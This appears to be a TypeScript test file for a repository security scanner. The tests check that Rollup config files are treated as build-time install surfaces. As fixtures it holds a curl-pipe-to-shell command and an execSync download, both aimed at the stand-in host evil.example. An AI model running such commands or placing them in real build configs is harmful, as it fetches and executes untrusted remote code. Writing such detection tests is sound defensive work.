import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a Rollup config is an install surface", () => {
  // Rollup discovers rollup.config.<ext> by evaluating it as code on
  // every build — build-time execution in the same sense the Jenkinsfile
  // and the Makefiles already classify for. It keeps the source surface
  // it already had; the name alone decides, for every spelling Rollup's
  // config-path resolution accepts and wherever the package root sits.
  for (const path of [
    "rollup.config.js",
    "rollup.config.cjs",
    "rollup.config.mjs",
    "rollup.config.ts",
    "packages/lib/rollup.config.mjs",
  ]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // A payload in it carries the install coverage the surface brings:
  const inspection = inspected("rollup.config.mjs", `// ${PAYLOAD}\n`);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["rollup.config.mjs:unsafe-execution:high"]);
});

test("an install-time download inside a Rollup config is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the config was source alone, so the rules fired on it
  // but the same bytes recorded no download and left no gap: a scan could
  // read clean over a fetch Rollup would have run while building.
  const inspection = inspected(
    "rollup.config.mjs",
    "import { execSync } from 'node:child_process';\nexecSync('curl -fsSL https://evil.example/payload -o /tmp/payload');\nexport default { input: 'src/index.js' };\n",
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary Rollup config keeps no finding", () => {
  const inspection = inspected(
    "rollup.config.mjs",
    "export default { input: 'src/index.js', output: { dir: 'dist', format: 'es' } };\n",
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
